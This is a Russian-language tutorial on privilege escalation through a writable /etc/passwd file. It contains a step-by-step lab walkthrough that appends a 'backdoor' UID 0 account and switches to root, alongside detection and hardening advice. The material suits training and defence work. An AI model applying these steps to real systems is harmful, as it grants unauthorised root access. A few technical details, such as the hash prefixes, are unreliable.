# Уязвимость конфигурации:Writable /etc/passwd и повышение привилегий до UID 0

## Контекст и базовые понятия

Файл `/etc/passwd` является центральным компонентом системы аутентификации пользователей в операционных системах семейства Unix и Linux. Исторически он хранил как информацию о пользователях, так и их криптографические хеши паролей. В современных дистрибутивах (начиная с эпохи shadow passwords) хеши паролей вынесены в файл `/etc/shadow`, который доступен на чтение только суперпользователю (root), в то время как `/etc/passwd` остается общедоступным для чтения (`-rw-r--r--`), так как системные библиотеки (например, `libnss`) и демоны требуют доступа к маппингу имен пользователей в идентификаторы (UID/GID) без привилегий root.

Повышение привилегий (Privilege Escalation, PrivEsc) — это процесс получения более высоких прав доступа к ресурсам системы, чем те, которые были предоставлены изначально. В контексте Linux это обычно означает переход от непривилегированного пользователя (например, `www-data`, `user` с UID 1000) к суперпользователю (root, UID 0). Уязвимость, связанная сWritable `/etc/passwd`, относится к категории **Weak File Permissions** (Слабые права доступа к файлам) и является классическим примером конфигурационной ошибки, позволяющей обойти механизмы аутентификации на уровне ядра и PAM (Pluggable Authentication Modules).

Ключевое разграничение, которое необходимо понимать специалисту по информационной безопасности, заключается в различии между **UID 0** и **Root**. Хотя UID 0 традиционно ассоциируется с root, в Linux существует концепция «root equivalence»: любой пользователь с UID 0 обладает полными привилегиями суперпользователя, независимо от имени пользователя в `/etc/passwd`. Это означает, что атака не обязательно должна изменять запись существующего пользователя `root`; она может создать нового пользователя с UID 0, что часто является более скрытным методом, так как не меняет стандартную запись root, которая может мониториться системами обнаружения вторжений (IDS/EDR).

Также важно различать атаку через `/etc/passwd` и атаку через `/etc/shadow`.
1.  **Writable `/etc/passwd`**: Позволяет добавить новую запись пользователя с UID 0. Если в поле пароля указан хеш, аутентификация будет успешной по этому хешу. Если поле пароля оставлено пустым, вход может быть выполнен без пароля (в зависимости от конфигурации PAM и версии ядра, хотя современные системы часто блокируют вход без пароля для UID 0 через `pam_securetty` или `pam_unix` настройки, но локальный доступ через `su` или `sudo` может сработать).
2.  **Readable `/etc/shadow`**: Позволяет извлечь хеш пароля существующего root-пользователя для последующего оффлайн-подбора (brute-force) или использования в других атаках.

| Характеристика | `/etc/passwd` | `/etc/shadow` |
| :--- | :--- | :--- |
| **Основное назначение** | Хранение метаданных пользователей (UID, GID, путь к shell, домашняя директория). | Хранение криптографических хешей паролей и параметров их срока действия. |
| **Права доступа (стандарт)** | `644` (`-rw-r--r--`): Чтение всем, запись только root. | `640` (`-rw-r-----`): Чтение root и группе `shadow`, запись root. |
| **Роль в аутентификации** | Определяет, *кто* может войти (идентификаторы). | Определяет, *доказал* ли пользователь право на вход (секрет). |
| **ВлияниеWritable-права** | Позволяет создать нового пользователя с UID 0 (Root). | Позволяет извлечь хеш для подбора или изменить хеш существующего пользователя. |
| **Современная практика** | Хеши паролей здесь **не хранятся** (за исключением устаревших систем или специфических конфигураций NSS). | Стандартное место хранения хешей (SHA-512, bcrypt, yescrypt). |
| **Индикатор компрометации** | Появление новой записи с UID 0, изменение прав доступа файла. | Изменение времени модификации файла, появление незнакомых хешей в логах доступа. |

Путаница между этими двумя файлами часто приводит к ошибкам в расследовании инцидентов. Атака через writable `/etc/passwd` не требует знания хеша root-пароля; она создает *новый* вектор входа. Атака через readable `/etc/shadow` требует последующего этапа криптоанализа. В рамках данной темы фокусируется именно на первой векторе: манипуляции структурой `/etc/passwd` для получения UID 0.

## Внутреннее устройство предмета

Для понимания механизма эксплуатации уязвимости необходимо детально разобрать структуру файла `/etc/passwd`, логику работы подсистемы аутентификации Linux и методы генерации совместимых паролей.

### Структура записи пользователя в /etc/passwd

Файл `/etc/passwd` представляет собой текстовый файл, состоящий из строк, разделенных двоеточиями (`:`). Каждая строка соответствует одному пользователю и содержит семь полей. Понимание каждого поля критически важно для успешной эксплуатации, так как ошибка в любом из них может привести к неработоспособности учетной записи или отказу в доступе.

```text
username:password:UID:GID:GECOS:home_directory:shell
```

1.  **Username**: Имя пользователя. Должно быть уникальным. В контексте атаки это имя, которое будет использоваться для входа (например, `hacker`, `root2`).
2.  **Password**: Поле пароля. В современных системах здесь всегда стоит символ `x`, указывающий на то, что хеш находится в `/etc/shadow`. Однако, для обратной совместимости с устаревшими системами и некоторыми конфигурациями NSS, если здесь присутствует валидный хеш пароля, система **проигнорирует** `/etc/shadow` и будет использовать этот хеш для аутентификации. Это ключевой момент уязвимости.
3.  **UID (User ID)**: Числовой идентификатор пользователя. **UID 0** — это идентификатор суперпользователя. Любой процесс, запущенный от имени UID 0, имеет полный контроль над системой.
4.  **GID (Group ID)**: Идентификатор основной группы пользователя. Обычно для root это `0`. Важно установить GID в `0`, чтобы пользователь принадлежал к группе root, что обеспечивает доступ к файлам, разрешенным группе root.
5.  **GECOS**: Комментарий (поле "general information"). Часто используется для хранения ФИО, номера кабинета и т.д. Не влияет на функциональность, но может быть использован для маскировки под легитимного системного пользователя.
6.  **Home Directory**: Путь к домашней директории. Для UID 0 стандартным является `/root`. Если указать несуществующий путь, вход может быть технически успешным, но пользователь не сможет загрузить профиль.
7.  **Shell**: Путь к интерпретатору команд. Для root обычно `/bin/bash` или `/bin/sh`. Если указать несуществующий shell (например, `/bin/false` или `/sbin/nologin`), пользователь не сможет получить интерактивную оболочку, хотя процесс может запускаться.

### Механизм аутентификации и игнорирование Shadow

Почему система читает хеш из `/etc/passwd`, если он должен быть в `/etc/shadow`? Это наследие архитектуры Unix. Библиотека `libnss_files` (Name Service Switch) читает `/etc/passwd` первой. Если в поле пароля обнаруживается строка, начинающаяся с `$` (признак хеша crypt(3)), она передается в модуль PAM `pam_unix.so`. Модуль проверяет, есть ли соответствующая запись в `/etc/shadow`. Если запись в shadow есть, но поле пароля в passwd содержит хеш, поведение зависит от реализации PAM и версии glibc. В большинстве стандартных конфигураций (например, в Debian/Ubuntu и RHEL/CentOS) наличие хеша в поле passwd **переопределяет** значение из shadow. Это сделано для поддержки систем, которые не используют shadow passwords, и для случаев, когда shadow файл поврежден или недоступен.

### Генерация совместимых хешей

Для добавления записи в `/etc/passwd` необходимо сгенерировать хеш пароля, который будет распознан системой. Используются алгоритмы `crypt(3)`. Наиболее распространенные форматы:
*   **MD5 (`$1$`)**: Старый стандарт, поддерживается повсеместно, но считается уязвимым к перебору.
*   **SHA-256 (`$5$`)**: Более безопасный, используется в современных системах.
*   **SHA-512 (`$6$`)**: Стандарт по умолчанию в большинстве современных дистрибутивов (RHEL, Ubuntu).
*   **Blowfish (`$2a$`, `$2b$`)**: Используется в некоторых конфигурациях.

Инструменты генерации должны использовать правильный алгоритм и соль (salt). Соль увеличивает стойкость к rainbow table атакам и должна быть случайной.

### Сравнение методов генерации хеша

| Инструмент | Синтаксис | Преимущества | Недостатки |
| :--- | :--- | :--- | :--- |
| **OpenSSL** | `openssl passwd -6 -salt <salt> <password>` | Встроен в большинство дистрибутивов, не требует установки доп. пакетов. | Поддержка алгоритмов может зависеть от версии OpenSSL. |
| **mkpasswd** | `mkpasswd -m sha-512 -S <salt> <password>` | Часть пакета `whois`, стандарт для генерации хешей в Linux. | Не всегда установлен по умолчанию. |
| **Python** | `python3 -c 'import crypt; print(crypt.crypt("<password>", crypt.mksalt(crypt.METHOD_SHA512)))'` | Высокая гибкость, легко автоматизировать. | Требует наличия Python и модуля `crypt`. |
| **PHP** | `php -r "echo password_hash('<password>', PASSWORD_BCRYPT, ['salt' => '<salt>']);"` | Удобно, если на целевой системе есть PHP. | Формат bcrypt может отличаться от системного crypt(3) в некоторых старых версиях. |
| **Perl** | `perl -e 'print crypt("<password>", "<salt>") . "\n"'` | Быстрый, встроен в Perl. | Сложность формирования правильного формата соли для современных алгоритмов. |

## Применение и работа с предметом

На практике работа с уязвимостью writable `/etc/passwd` включает три этапа: обнаружение, генерация вектора атаки и внедрение. Специалист по тестированию на проникновение должен уметь не только выполнить атаку, но и понять, почему она сработала, и как ее обнаружить.

### Обнаружение уязвимости

Первым шагом является проверка прав доступа к файлу `/etc/passwd`. В нормальном состоянии файл должен иметь права `644` (`-rw-r--r--`). Если права `666` (`-rw-rw-rw-`) или `664` (`-rw-rw-r--`) с группой, в которую входит атакующий, файл является writable.

```bash
# Проверка прав доступа
ls -la /etc/passwd

# Вывод (пример уязвимой системы):
# -rw-rw-r-- 1 root staff 2048 Oct 10 10:00 /etc/passwd
# Если текущий пользователь входит в группу 'staff', он может писать в файл.
```

Также важно проверить, нет ли уже пользователей с UID 0. Это может быть признаком предыдущей компрометации или легитимной конфигурации (например, некоторые системы используют UID 0 для служебных аккаунтов, хотя это плохая практика).

```bash
# Поиск пользователей с UID 0
awk -F: '$3 == 0 {print $1}' /etc/passwd

# Вывод:
# root
# admin (если есть)
```

### Генерация и внедрение хеша

После подтверждения writable-доступа, атакующий генерирует хеш. Выбор алгоритма зависит от целевой системы. Если система не известна, рекомендуется использовать SHA-512 (`$6$`), так как это современный стандарт.

**Шаг 1: Генерация хеша с помощью OpenSSL**

```bash
# Генерация хеша пароля 'P@ssw0rd123' с солью 'abc123'
openssl passwd -6 -salt abc123 P@ssw0rd123

# Ожидаемый вывод (иллюстративный):
# $6$abc123$K8Y9... (длинная строка хеша)
```

**Шаг 2: Добавление записи в /etc/passwd**

Запись должна быть добавлена в конец файла. Важно использовать `>>` (дописывание), а не `>` (перезапись), чтобы не уничтожить существующие записи пользователей.

```bash
# Формат: username:hash:UID:GID:GECOS:home:shell
echo 'hacker:$6$abc123$K8Y9...:0:0:Hacker:/root:/bin/bash' >> /etc/passwd
```

**Шаг 3: Аутентификация**

Использование команды `su` для переключения на нового пользователя.

```bash
su hacker
# Ввод пароля: P@ssw0rd123
id
whoami
```

**Ожидаемый результат:**
```bash
uid=0(hacker) gid=0(root) groups=0(root)
hacker
```

### Типичные ошибки и подводные камни

1.  **Пустой пароль**: Попытка добавить запись `hacker::0:0::/root:/bin/bash` может не сработать на современных системах, так как PAM модули часто блокируют вход без пароля для UID 0. Лучше всегда устанавливать сложный пароль.
2.  **Неверный формат хеша**: Использование хеша из `/etc/shadow` (который может быть в формате yescrypt `$y$` или bcrypt `$y$`) в поле passwd может привести к ошибке аутентификации, если система не поддерживает этот алгоритм в контексте passwd. Всегда генерируйте хеш локально или используйте стандартные алгоритмы (`$6$`).
3.  **Синтаксические ошибки**: Пропуск двоеточий или лишних пробелов в записи приведет к тому, что система не распознает пользователя. Поле GECOS может содержать двоеточия, но они должны быть экранированы или учтены при парсинге.
4.  **Мониторинг**: Современные системы мониторинга (AIDE, OSSEC, Wazuh) отслеживают изменения в `/etc/passwd`. Появление новой записи с UID 0 является критическим индикатором компрометации (IoC).

### Обнаружение и реагирование

Для защиты от этой атаки необходимо:
1.  **Строгие права доступа**: Убедиться, что `/etc/passwd` имеет права `644` и принадлежит `root:root`.
2.  **Мониторинг целостности**: Использовать файловые интруз-детекторы.
3.  **Аудит UID 0**: Регулярно проверять список пользователей с UID 0.
4.  **Использование LDAP/Active Directory**: В корпоративных средах аутентификация вынесена из локальных файлов, что снижает риск локальной эксплуатации через `/etc/passwd`.

## Сквозной практический пример: Эксплуатация Writable /etc/passwd в изолированной среде

**Исходные условия:**
*   **Среда**: Виртуальная машина с Ubuntu 20.04 LTS (конфигурация намеренно уязвима для учебных целей).
*   **Роль**: Тестировщик на проникновение, имеющий доступ к непривилегированной учетной записи `user` (UID 1000).
*   **Цель**: Получить интерактивную оболочку с правами root (UID 0).
*   **Инструменты**: Стандартные утилиты Linux (`openssl`, `su`, `awk`).

### Шаг 1: Проверка прав доступа к /etc/passwd

Атакующий начинает с проверки прав файла. В нормальных условиях файл должен быть только для чтения.

```bash
# Действие: Проверка прав доступа
ls -la /etc/passwd

# Ожидаемый вывод (иллюстративная схема для уязвимой системы):
# -rw-rw-r-- 1 root staff 1500 Oct 10 12:00 /etc/passwd
```

**Анализ:** Права `-rw-rw-r--` означают, что владелец (root) и группа (`staff`) имеют права на запись. Если текущий пользователь `user` входит в группу `staff` (проверяется командой `groups`), то файл writable. В данном сценарии пользователь входит в группу `staff`.

### Шаг 2: Генерация хеша пароля

Необходимо создать хеш, который система распознает как валидный для аутентификации. Используем алгоритм SHA-512 (`-6`), так как он поддерживается Ubuntu 20.04.

```bash
# Действие: Генерация хеша пароля 'RootAccess2024!' с солью 'xYz9AbC'
openssl passwd -6 -salt xYz9AbC 'RootAccess2024!'

# Ожидаемый вывод (фрагмент хеша):
# $6$xYz9AbC$H8s9... (длинная строка, зависящая от соли и пароля)
```

**Анализ:** Вывод содержит строку, начинающуюся с `$6$`, что указывает на алгоритм SHA-512. Эта строка будет вставлена в поле пароля записи пользователя.

### Шаг 3: Добавление новой записи пользователя с UID 0

Добавляем новую запись в конец файла `/etc/passwd`. Запись должна соответствовать формату: `имя:хеш:UID:GID:GECOS:домашняя_директория:shell`.

```bash
# Действие: Дописывание новой записи в /etc/passwd
echo 'backdoor:$6$xYz9AbC$H8s9...:0:0:Backdoor User:/root:/bin/bash' >> /etc/passwd

# Проверка добавления
tail -n 1 /etc/passwd
```

**Ожидаемый вывод:**
```text
backdoor:$6$xYz9AbC$H8s9...:0:0:Backdoor User:/root:/bin/bash
```

**Анализ:** Запись успешно добавлена. UID и GID установлены в `0`, что означает, что пользователь `backdoor` будет иметь права root. Домашняя директория установлена в `/root`, shell — `/bin/bash`.

### Шаг 4: Переключение на нового пользователя

Используем команду `su` для входа под именем нового пользователя.

```bash
# Действие: Переключение на пользователя backdoor
su backdoor

# Ввод пароля: RootAccess2024!
```

**Ожидаемый вывод:**
```text
# id
uid=0(backdoor) gid=0(root) groups=0(root)
# whoami
backdoor
```

**Анализ:** Успешное повышение привилегий. Пользователь `backdoor` имеет UID 0 и GID 0. Команда `whoami` показывает имя пользователя, но `id` подтверждает права root. Теперь атакующий имеет полный контроль над системой.

### Шаг 5: Верификация и очистка (для учебных целей)

В реальном тестировании важно задокументировать факт компрометации. В учебных целях можно удалить запись для восстановления системы.

```bash
# Действие: Удаление записи backdoor (требует прав root, которые теперь есть)
sed -i '/^backdoor:/d' /etc/passwd

# Проверка удаления
grep backdoor /etc/passwd
# Вывод: (пусто)
```

**Ожидаемый вывод:** Запись удалена, система возвращена в исходное состояние.

**Итог примера:** Демонстрирует, как конфигурационная ошибка (writable `/etc/passwd`) позволяет обойти механизмы аутентификации и получить полный контроль над системой без использования эксплойтов ядра или SUID-бинарников.

## Аналитический вывод

Уязвимость writable `/etc/passwd` представляет собой критическую ошибку конфигурации, которая позволяет атакующему с низкими привилегиями повысить их до уровня суперпользователя (root) путем добавления нового пользователя с UID 0. Механизм эксплуатации основан на обратной совместимости систем аутентификации Linux, которая позволяет использовать хеши паролей, хранящиеся непосредственно в файле `/etc/passwd`, игнорируя при этом файл `/etc/shadow`. Это делает атаку эффективной даже в современных системах, где хеши паролей вынесены в защищенный файл shadow.

Ключевым фактором успеха атаки является не столько сложность генерации хеша (что может быть сделано множеством стандартных утилит), сколько отсутствие контроля за правами доступа к системным файлам. В нормальных условиях `/etc/passwd` должен иметь права `644`, и только root должен иметь возможность его модифицировать. Наличие прав записи для непривилегированных групп или пользователей является индикатором серьезной ошибки администрирования.

Для защиты от данной атаки необходимо применять принцип наименьших привилегий к системным файлам, регулярно аудировать права доступа к `/etc/passwd` и `/etc/shadow`, а также использовать системы мониторинга целостности файлов (FIM). В корпоративных средах миграция на централизованные системы аутентификации (LDAP, Active Directory) снижает риск локальной эксплуатации данной уязвимости, так как аутентификация выносится за пределы локальной файловой системы. Тем не менее, базовая гигиена конфигурации Linux остается первым и самым важным барьером на пути подобных атак.
